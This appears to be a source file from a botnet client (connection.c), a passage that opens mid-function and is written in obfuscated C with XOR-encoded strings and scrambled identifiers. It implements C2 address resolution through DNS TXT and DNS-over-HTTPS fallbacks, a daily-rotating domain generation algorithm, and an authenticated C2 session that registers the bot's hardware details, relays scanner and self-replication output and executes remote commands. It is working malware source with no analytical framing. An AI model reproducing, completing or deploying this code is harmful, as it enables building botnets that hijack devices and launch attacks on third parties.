                            ds_set(&ip, ds_cstr(&cand));
                            ds_free(&cand);
                            ds_free(&body);
                            return ip;
                        }
                    }
                    ds_free(&cand);
                }
                dp = strstr(q2, _S(6,0x8e,0xc8,0xcd,0xd8,0xcd,0x8e));
            }

            ds_free(&body);
        }
    }

    return ip;
}

/* ======================================================================
   eS2nM4J — plain HTTP GET (no HTTPS). Returns body as dstr.
   ====================================================================== */

dstr eS2nM4J(const char *url, int timeout_sec)
{
    dstr result;
    dstr host_str, port_str, path_str;
    const char *p, *slash, *colon;
    int fd;
    dstr req;
    char buf[4096];
    ssize_t n;
    dstr raw;
    const char *body_start;

    ds_init(&result);
    if (!url) return result;

    /* parse URL: http://host[:port]/path */
    p = url;
    if (strncmp(p, _S(7,0xc4,0xd8,0xd8,0xdc,0x96,0x83,0x83), 7) == 0) {
        p += 7;
    } else if (strncmp(p, _S(8,0xc4,0xd8,0xd8,0xdc,0xdf,0x96,0x83,0x83), 8) == 0) {
        /* we don't support https in eS2nM4J */
        return result;
    }

    ds_init(&host_str);
    ds_init(&port_str);
    ds_init(&path_str);

    slash = strchr(p, '/');
    if (slash) {
        dstr hostport;
        ds_init(&hostport);
        ds_setn(&hostport, p, (size_t)(slash - p));
        ds_set(&path_str, slash);

        colon = strchr(ds_cstr(&hostport), ':');
        if (colon) {
            ds_setn(&host_str, ds_cstr(&hostport), (size_t)(colon - ds_cstr(&hostport)));
            ds_set(&port_str, colon + 1);
        } else {
            ds_set(&host_str, ds_cstr(&hostport));
            ds_set(&port_str, _S(2,0x94,0x9c));
        }
        ds_free(&hostport);
    } else {
        colon = strchr(p, ':');
        if (colon) {
            ds_setn(&host_str, p, (size_t)(colon - p));
            ds_set(&port_str, colon + 1);
        } else {
            ds_set(&host_str, p);
            ds_set(&port_str, _S(2,0x94,0x9c));
        }
        ds_set(&path_str, _S(1,0x83));
    }

    fd = tcp_connect(ds_cstr(&host_str), ds_cstr(&port_str), timeout_sec);
    if (fd < 0) {
        ds_free(&host_str);
        ds_free(&port_str);
        ds_free(&path_str);
        return result;
    }

    _Hh6mZ4r(fd, timeout_sec);

    /* build HTTP request */
    ds_init(&req);
    ds_cat(&req, _S(4,0xeb,0xe9,0xf8,0x8c));
    ds_catds(&req, &path_str);
    ds_cat(&req, _S(17,0x8c,0xe4,0xf8,0xf8,0xfc,0x83,0x9d,0x82,0x9c,0xa1,0xa6,0xe4,0xc3,0xdf,0xd8,0x96,0x8c));
    ds_catds(&req, &host_str);
    ds_cat(&req, _S(10,0xa1,0xa6,0xed,0xcf,0xcf,0xc9,0xdc,0xd8,0x96,0x8c));
    if (ds_len(&_so3eq8T) > 0) {
        ds_catds(&req, &_so3eq8T);
    } else {
        ds_cat(&req, _S(3,0x86,0x83,0x86));
    }
    ds_cat(&req, _S(23,0xa1,0xa6,0xef,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc3,0xc2,0x96,0x8c,0xcf,0xc0,0xc3,0xdf,0xc9,0xa1,0xa6,0xa1,0xa6));

    {
        size_t off = 0;
        size_t total = ds_len(&req);
        while (off < total) {
            n = write(fd, ds_cstr(&req) + off, total - off);
            if (n <= 0) break;
            off += (size_t)n;
        }
    }
    ds_free(&req);

    /* read response */
    ds_init(&raw);
    for (;;) {
        n = read(fd, buf, sizeof(buf));
        if (n <= 0) break;
        ds_catn(&raw, buf, (size_t)n);
    }

    close(fd);
    ds_free(&host_str);
    ds_free(&port_str);
    ds_free(&path_str);

    /* find body after \r\n\r\n */
    body_start = strstr(ds_cstr(&raw), _S(4,0xa1,0xa6,0xa1,0xa6));
    if (body_start) {
        body_start += 4;
        ds_set(&result, body_start);
    } else {
        /* no header separator — return everything */
        ds_set(&result, ds_cstr(&raw));
    }

    ds_free(&raw);
    return result;
}

/* ======================================================================
   _TL7fj2H — pair an IP with a comma-separated port string.
   Pushes "ip:p1", "ip:p2", ... into result.
   ====================================================================== */

static void _TL7fj2H(strarr *result, const char *ip, const char *ports)
{
    const char *pp;
    dstr tok;

    if (!ports || *ports == '\0') ports = _S(3,0x98,0x98,0x9f);

    ds_init(&tok);
    pp = ports;
    while (*pp) {
        if (*pp == ',') {
            if (ds_len(&tok) > 0) {
                dstr entry;
                ds_init(&entry);
                ds_set(&entry, ip);
                ds_catc(&entry, ':');
                ds_catds(&entry, &tok);
                sa_pushds(result, &entry);
                ds_free(&entry);
                ds_clear(&tok);
            }
            pp++;
        } else {
            ds_catc(&tok, *pp);
            pp++;
        }
    }
    if (ds_len(&tok) > 0) {
        dstr entry;
        ds_init(&entry);
        ds_set(&entry, ip);
        ds_catc(&entry, ':');
        ds_catds(&entry, &tok);
        sa_pushds(result, &entry);
        ds_free(&entry);
    }
    ds_free(&tok);
}

/* ======================================================================
   Fc7FE8v — resolve a "decoded" config entry to addresses.
   Tries: direct "host:port", DNS TXT fallback, DoH fallback.
   ====================================================================== */

strarr Fc7FE8v(const char *decoded)
{
    strarr result;
    int is_ip = 0;
    dstr txt_domain;
    dstr cfg_port;       /* port from original config entry, used for bare-IP TXT */

    sa_init(&result);
    if (!decoded || *decoded == '\0') return result;

    ds_init(&txt_domain);
    ds_init(&cfg_port);

    /* parse host:port(s) if present — port may be comma-separated */
    if (strchr(decoded, ':')) {
        dstr h, p;
        if (gv4Kv3u(decoded, &h, &p)) {
            struct in_addr tmp;
            if (inet_pton(AF_INET, ds_cstr(&h), &tmp) == 1) {
                /* direct IP:port(s) — expand comma-separated ports */
                is_ip = 1;
                _TL7fj2H(&result, ds_cstr(&h), ds_cstr(&p));
            } else if (SZ2yL5g(ds_cstr(&h))) {
                /* hostname — extract for TXT lookup first */
                ds_set(&txt_domain, ds_cstr(&h));
                ds_set(&cfg_port, ds_cstr(&p));
            }
            ds_free(&h);
            ds_free(&p);
            if (is_ip) { ds_free(&txt_domain); ds_free(&cfg_port); return result; }
        }
    }

    /* determine domain to query TXT records for */
    {
        const char *domain = ds_len(&txt_domain) > 0 ? ds_cstr(&txt_domain) : decoded;

        /* try DNS TXT via system resolvers */
        _nS5PJ8Y(_S(25,0xea,0xcf,0x9b,0xea,0xe9,0x94,0xda,0x96,0x8c,0xf8,0xf4,0xf8,0x8c,0xdd,0xd9,0xc9,0xde,0xd5,0x8c,0xca,0xc3,0xde,0x8c,0x89,0xdf), domain);
        {
            strarr dns = LF5UQ4v(domain);
            if (sa_count(&dns) > 0) {
                size_t i;
                for (i = 0; i < sa_count(&dns); i++) {
                    /* first try host:port format */
                    strarr addrs = kS6pU7n(sa_get(&dns, i));
                    if (sa_count(&addrs) > 0) {
                        sa_insert(&result, &addrs);
                    } else {
                        /* try bare IPs — pair with cfg_port (may be multi-port) */
                        strarr ips = Vc2mZ5Q(sa_get(&dns, i));
                        size_t j;
                        const char *pstr = ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : _S(3,0x98,0x98,0x9f);
                        for (j = 0; j < sa_count(&ips); j++) {
                            _TL7fj2H(&result, sa_get(&ips, j), pstr);
                        }
                        sa_free(&ips);
                    }
                    sa_free(&addrs);
                }
            }
            sa_free(&dns);
            if (sa_count(&result) > 0) { ds_free(&txt_domain); ds_free(&cfg_port); return result; }
        }

        /* fallback: DoH TXT */
        {
            strarr dns = Go3xC6n(domain);
            if (sa_count(&dns) > 0) {
                size_t i;
                for (i = 0; i < sa_count(&dns); i++) {
                    strarr addrs = kS6pU7n(sa_get(&dns, i));
                    if (sa_count(&addrs) > 0) {
                        sa_insert(&result, &addrs);
                    } else {
                        strarr ips = Vc2mZ5Q(sa_get(&dns, i));
                        size_t j;
                        const char *pstr = ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : _S(3,0x98,0x98,0x9f);
                        for (j = 0; j < sa_count(&ips); j++) {
                            _TL7fj2H(&result, sa_get(&ips, j), pstr);
                        }
                        sa_free(&ips);
                    }
                    sa_free(&addrs);
                }
            }
            sa_free(&dns);
            if (sa_count(&result) > 0) { ds_free(&txt_domain); ds_free(&cfg_port); return result; }
        }
    }

    /* last resort: use decoded address directly (relies on A record / getaddrinfo) */
    if (ds_len(&txt_domain) > 0) {
        _nS5PJ8Y(_S(46,0xea,0xcf,0x9b,0xea,0xe9,0x94,0xda,0x96,0x8c,0xf8,0xf4,0xf8,0x8c,0xc9,0xc1,0xdc,0xd8,0xd5,0x80,0x8c,0xca,0xcd,0xc0,0xc0,0xc5,0xc2,0xcb,0x8c,0xce,0xcd,0xcf,0xc7,0x8c,0xd8,0xc3,0x8c,0xc8,0xc5,0xde,0xc9,0xcf,0xd8,0x96,0x8c,0x89,0xdf), ds_cstr(&txt_domain));
        _TL7fj2H(&result, ds_cstr(&txt_domain),
                        ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : _S(3,0x98,0x98,0x9f));
    } else if (!is_ip && strchr(decoded, ':') == NULL) {
        /* bare hostname without port — TXT failed, try A record via getaddrinfo */
        _nS5PJ8Y(_S(50,0xea,0xcf,0x9b,0xea,0xe9,0x94,0xda,0x96,0x8c,0xce,0xcd,0xde,0xc9,0x8c,0xc4,0xc3,0xdf,0xd8,0xc2,0xcd,0xc1,0xc9,0x80,0x8c,0xca,0xcd,0xc0,0xc0,0xc5,0xc2,0xcb,0x8c,0xce,0xcd,0xcf,0xc7,0x8c,0xd8,0xc3,0x8c,0xc8,0xc5,0xde,0xc9,0xcf,0xd8,0x96,0x8c,0x89,0xdf), decoded);
        _TL7fj2H(&result, decoded, _S(3,0x98,0x98,0x9f));
    }

    ds_free(&txt_domain);
    ds_free(&cfg_port);
    return result;
}

/* ======================================================================
   dH7QB8j — decrypt config entry at index, resolve to addresses
   ====================================================================== */

strarr dH7QB8j(int idx)
{
    strarr result;
    dstr decoded;

    sa_init(&result);

    if (idx < 0 || idx >= (int)sa_count(&_zU4TP2B)) return result;

    decoded = _Kd6BF5m(sa_get(&_zU4TP2B, idx));
    if (ds_len(&decoded) == 0) {
        ds_free(&decoded);
        return result;
    }

    _nS5PJ8Y(_S(25,0xc8,0xe4,0x9b,0xfd,0xee,0x94,0xc6,0xf7,0x89,0xc8,0xf1,0x96,0x8c,0xc8,0xc9,0xcf,0xc3,0xc8,0xc9,0xc8,0x8c,0x91,0x8c,0x89,0xdf), idx, ds_cstr(&decoded));
    result = Fc7FE8v(ds_cstr(&decoded));
    ds_free(&decoded);
    return result;
}

/* ======================================================================
   Bp6se4h — DGA domain generation for a given index
   Generates domain + port from daily rotating seed.
   ====================================================================== */

void Bp6se4h(int index, dstr *domain_out, dstr *port_out)
{
    time_t now;
    struct tm *t;
    _BW4EK8x ctx;
    uint8_t hash[32];
    char seed_str[128];
    char domain_buf[64];
    int port_num;
    int i;

    ds_init(domain_out);
    ds_init(port_out);

    now = time(NULL);
    t   = gmtime(&now);

    /* seed = config_seed + year + month + day + index */
    iB2Zq4a();
    snprintf(seed_str, sizeof(seed_str), _S(16,0x89,0xdf,0x89,0x9c,0x98,0xc8,0x89,0x9c,0x9e,0xc8,0x89,0x9c,0x9e,0xc8,0x89,0xc8),
             ds_cstr(&_gC8se3d),
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             index);

    /* hash the seed with sha256 streaming API */
    _tP5sQ3C(&ctx);
    _iS7pL8N(&ctx, (const uint8_t *)seed_str, strlen(seed_str));
    _Vd5Ph6z(&ctx, hash);

    /* generate domain label from first 16 bytes of hash */
    for (i = 0; i < 16; i++) {
        domain_buf[i] = 'a' + (hash[i] % 26);
    }
    domain_buf[16] = '\0';

    ds_set(domain_out, domain_buf);
    ds_catds(domain_out, &_dT5lg2z);

    /* port from bytes 16-17 of hash, mapped to 1024-65535 */
    port_num = 1024 + (((int)hash[16] << 8) | hash[17]) % (65535 - 1024);

    {
        char pbuf[8];
        snprintf(pbuf, sizeof(pbuf), _S(2,0x89,0xc8), port_num);
        ds_set(port_out, pbuf);
    }

    _nS5PJ8Y(_S(18,0xee,0xdc,0x9a,0xdf,0xc9,0x98,0xc4,0xf7,0x89,0xc8,0xf1,0x96,0x8c,0x89,0xdf,0x96,0x89,0xdf), index, ds_cstr(domain_out), ds_cstr(port_out));
}

/* ======================================================================
   xu4si4C — resolve hostname to IP via DoH (DR4Wt6N) then system DNS
   ====================================================================== */

dstr xu4si4C(const char *domain)
{
    dstr ip;

    /* try DoH first */
    ip = DR4Wt6N(domain);
    if (ds_len(&ip) > 0) return ip;

    /* fallback: system getaddrinfo */
    {
        struct addrinfo hints, *res;
        int ret;

        memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        ret = getaddrinfo(domain, NULL, &hints, &res);
        if (ret == 0 && res) {
            struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
            char buf[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &sin->sin_addr, buf, sizeof(buf));
            ds_set(&ip, buf);
            freeaddrinfo(res);
        }
    }

    return ip;
}

/* ======================================================================
   Ht7Lk2Y — C2 session handler (auth + command loop)

   Protocol (over encrypted EZF3 channel):
     Server → "AUTH_CHALLENGE:<challenge>\n"
     Bot    → sha256_b64(challenge + SYNC_TOKEN + challenge) + "\n"
     Server → "AUTH_SUCCESS\n"  or  "AUTH_FAILED\n"
     Bot    → "REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc>\n"
     Server → "PING\n"     Bot → "PONG\n"
     Server → "<command>\n" Bot → executes via CS6Ko7t
   ====================================================================== */

void Ht7Lk2Y(_EA8up4M *c)
{
    dstr line;
    dstr challenge;
    dstr response;
    dstr reg_msg;
    char ram_str[32], cpu_str[16];

    if (!c || !c->valid) return;

    /* Initialize protocol strings (lazy decrypt) */
    DS4RR2W();

    /* Step 1: Read AUTH_CHALLENGE */
    line = Un4Ss4D(c, 15);
    if (ds_len(&line) == 0) {
        _nS5PJ8Y(_S(30,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xc2,0xc3,0x8c,0xcf,0xc4,0xcd,0xc0,0xc0,0xc9,0xc2,0xcb,0xc9,0x8c,0xde,0xc9,0xcf,0xc9,0xc5,0xda,0xc9,0xc8));
        ds_free(&line);
        return;
    }

    /* expect "AUTH_CHALLENGE:<challenge>" */
    if (strncmp(ds_cstr(&line), _S(15,0xed,0xf9,0xf8,0xe4,0xf3,0xef,0xe4,0xed,0xe0,0xe0,0xe9,0xe2,0xeb,0xe9,0x96), 15) != 0) {
        _nS5PJ8Y(_S(23,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xd9,0xc2,0xc9,0xd4,0xdc,0xc9,0xcf,0xd8,0xc9,0xc8,0x96,0x8c,0x89,0xdf), ds_cstr(&line));
        ds_free(&line);
        return;
    }

    ds_init(&challenge);
    ds_set(&challenge, ds_cstr(&line) + 15);
    ds_free(&line);

    /* Step 2: Compute response = _Xe8Yw5c(challenge, sync_token)
       = base64(sha256(challenge + sync_token + challenge)) */
    response = _Xe8Yw5c(ds_cstr(&challenge), ds_cstr(&_Lv3Qk8T));
    ds_free(&challenge);

    /* send response — append \n and send as a single frame so the CNC's
       ReadFrame for the REGISTER message isn't consumed by a bare "\n" frame */
    ds_catc(&response, '\n');
    Ng2ZR5y(c, ds_cstr(&response));
    ds_free(&response);

    if (!c->valid) return;

    /* Step 3: Read AUTH_SUCCESS or AUTH_FAILED */
    line = Un4Ss4D(c, 15);
    if (ds_len(&line) == 0 || !ds_eq(&line, ds_cstr(&_KB5jb2q))) {
        _nS5PJ8Y(_S(24,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xcd,0xd9,0xd8,0xc4,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x96,0x8c,0x89,0xdf), ds_cstr(&line));
        ds_free(&line);
        return;
    }
    ds_free(&line);

    _nS5PJ8Y(_S(22,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xcd,0xd9,0xd8,0xc4,0xc9,0xc2,0xd8,0xc5,0xcf,0xcd,0xd8,0xc9,0xc8));

    /* Step 4: Send REGISTER message
       Format: REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc>:<uplink> */
    ds_init(&reg_msg);

    snprintf(ram_str, sizeof(ram_str), _S(4,0x89,0xc0,0xc0,0xc8), (long long)_GL4jD4V);
    snprintf(cpu_str, sizeof(cpu_str), _S(2,0x89,0xc8), _Ym3DC2v);

    /* Build: REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc> */
    ds_cat(&reg_msg, _S(9,0xfe,0xe9,0xeb,0xe5,0xff,0xf8,0xe9,0xfe,0x96));
    ds_catds(&reg_msg, &_bT4ag3x);
    ds_cat(&reg_msg, _S(1,0x96));
    ds_cat(&reg_msg, ds_cstr(&_yg5RE4m));
    ds_cat(&reg_msg, _S(1,0x96));
    ds_cat(&reg_msg, ds_cstr(&_dG3DF2X));
    ds_cat(&reg_msg, _S(1,0x96));
    ds_cat(&reg_msg, ram_str);
    ds_cat(&reg_msg, _S(1,0x96));
    ds_cat(&reg_msg, cpu_str);
    ds_cat(&reg_msg, _S(1,0x96));
    ds_cat(&reg_msg, ds_cstr(&_ZC6YY5F));
    ds_cat(&reg_msg, _S(1,0x96));
    ds_cat(&reg_msg, ds_empty(&_my4vH6P) ? _S(6,0xc8,0xc5,0xde,0xc9,0xcf,0xd8) : ds_cstr(&_my4vH6P));
#ifndef NO_SELFREP
    ds_cat(&reg_msg, _S(5,0x96,0xdf,0xcf,0xcd,0xc2));
#else
    ds_cat(&reg_msg, _S(7,0x96,0xc2,0xc3,0xdf,0xcf,0xcd,0xc2));
#endif
#ifndef NO_ATTACK
    ds_cat(&reg_msg, _S(4,0x96,0xcd,0xd8,0xc7));
#else
    ds_cat(&reg_msg, _S(6,0x96,0xc2,0xc3,0xcd,0xd8,0xc7));
#endif
    ds_cat(&reg_msg, _S(1,0xa6));

    Ng2ZR5y(c, ds_cstr(&reg_msg));
    ds_free(&reg_msg);

    if (!c->valid) return;

    _nS5PJ8Y(_S(42,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xde,0xc9,0xcb,0xc5,0xdf,0xd8,0xc9,0xde,0xc9,0xc8,0x80,0x8c,0xc9,0xc2,0xd8,0xc9,0xde,0xc5,0xc2,0xcb,0x8c,0xcf,0xc3,0xc1,0xc1,0xcd,0xc2,0xc8,0x8c,0xc0,0xc3,0xc3,0xdc));

    /* Step 5: Command loop — read first byte, dispatch binary or text */
    for (;;) {
        int first;

        /* Poll C2 fd + all scanner report pipes */
        {
            struct pollfd pfds[8];
            int nfds = 1, ret, c2_ready = 0;

            pfds[0].fd = c->fd;
            pfds[0].events = POLLIN;

#ifndef NO_SELFREP
            {
                int *scan_fds[] = { &_SV2eW7e, &_NG8vu2i, &_sn3ST8f };
                int si;
                for (si = 0; si < 3; si++) {
                    if (*scan_fds[si] >= 0) {
                        pfds[nfds].fd = *scan_fds[si];
                        pfds[nfds].events = POLLIN;
                        nfds++;
                    }
                }
            }
#endif

            ret = poll(pfds, nfds, 180 * 1000);

#ifndef NO_SELFREP
            /* Drain all active scanner pipes */
            {
                struct { int *fd; int *pid; } scanners[] = {
                    { &_SV2eW7e, &_bj8XN2t },
                    { &_NG8vu2i, &_AR2yQ6h },
                    { &_sn3ST8f, &_sn7PK3z },
                };
                int si;
                for (si = 0; si < 3; si++) {
                    if (*scanners[si].fd >= 0) {
                        char rpbuf[512];
                        ssize_t rn;
                        while ((rn = read(*scanners[si].fd, rpbuf, sizeof(rpbuf) - 1)) > 0) {
                            rpbuf[rn] = '\0';
                            Ng2ZR5y(c, rpbuf);
                        }
                        if (rn == 0) {
                            int dead_pid = *scanners[si].pid;
                            close(*scanners[si].fd);
                            *scanners[si].fd = -1;
                            *scanners[si].pid = 0;
                            if (dead_pid > 0) waitpid(dead_pid, NULL, WNOHANG);
                        }
                    }
                }
            }
#endif

            if (ret < 0 && errno == EINTR) continue;
            if (ret == 0) {
                _nS5PJ8Y(_S(39,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xc2,0xc3,0x8c,0xc8,0xcd,0xd8,0xcd,0x8c,0xc5,0xc2,0x8c,0x9d,0x94,0x9c,0xdf,0x80,0x8c,0xc8,0xc5,0xdf,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc2,0xcb));
                break;
            }

            c2_ready = (pfds[0].revents & POLLIN);
            if (!c2_ready) continue; /* only pipe had data, loop back */
        }

        first = nb2Fg4N(c, 0);

        if (!c->valid || first < 0) {
            break;
        }

        if ((uint8_t)first == CMD_MAGIC) {
            /* Binary command: [0xFF][cmd_id:1][len:2 BE][args:N] */
            uint8_t cmd_id;
            uint8_t len_buf[2];
            uint16_t args_len;
            char args[4096];

            if (AF6jH4z(c, &cmd_id, 1, 10) < 0) break;
            if (AF6jH4z(c, len_buf, 2, 10) < 0) break;
            args_len = ((uint16_t)len_buf[0] << 8) | len_buf[1];
            if (args_len > sizeof(args) - 1) {
                _nS5PJ8Y(_S(38,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xcd,0xde,0xcb,0xdf,0x8c,0xd8,0xc3,0xc3,0x8c,0xc0,0xcd,0xde,0xcb,0xc9,0x8c,0x84,0x89,0xc8,0x85,0x80,0x8c,0xc8,0xde,0xc3,0xdc,0xdc,0xc5,0xc2,0xcb), args_len);
                break;
            }
            if (args_len > 0) {
                if (AF6jH4z(c, args, args_len, 10) < 0) break;
                /* EZF3: no XOR layer — transport encryption handles all crypto */
            }
            args[args_len] = '\0';

            _nS5PJ8Y(_S(38,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xce,0xc5,0xc2,0x8c,0xcf,0xc1,0xc8,0x91,0x9c,0xd4,0x89,0x9c,0x9e,0xf4,0x8c,0xc0,0xc9,0xc2,0x91,0x89,0xc8,0x8c,0xcd,0xde,0xcb,0xdf,0x91,0x89,0xdf), cmd_id, args_len, args);
            yD8Ug8t(c, cmd_id, args);
        } else {
            /* Text line — accumulate rest until \n (PING/PONG or legacy) */
            dstr line;
            ds_init(&line);
            ds_catc(&line, (char)first);

            for (;;) {
                int b = nb2Fg4N(c, 180);
                if (b < 0 || b == '\n') break;
                if (b != '\r') ds_catc(&line, (char)b);
            }

            if (!c->valid) { ds_free(&line); break; }

            if (ds_eq(&line, _S(4,0xfc,0xe5,0xe2,0xeb))) {
                Ng2ZR5y(c, _S(5,0xfc,0xe3,0xe2,0xeb,0xa6));
                _nS5PJ8Y(_S(28,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xcb,0xc3,0xd8,0x8c,0xfc,0xe5,0xe2,0xeb,0x80,0x8c,0xdf,0xc9,0xc2,0xd8,0x8c,0xfc,0xe3,0xe2,0xeb));
            } else if (ds_len(&line) > 0) {
                /* Legacy text command fallback */
                _nS5PJ8Y(_S(22,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xd8,0xc9,0xd4,0xd8,0x8c,0xcf,0xc1,0xc8,0x8c,0x91,0x8c,0x89,0xdf), ds_cstr(&line));
                CS6Ko7t(c, ds_cstr(&line));
            }
            ds_free(&line);
        }
    }

    _nS5PJ8Y(_S(22,0xe4,0xd8,0x9b,0xe0,0xc7,0x9e,0xf5,0x96,0x8c,0xdf,0xc9,0xdf,0xdf,0xc5,0xc3,0xc2,0x8c,0xc9,0xc2,0xc8,0xc9,0xc8));
}

/* end of connection.c */
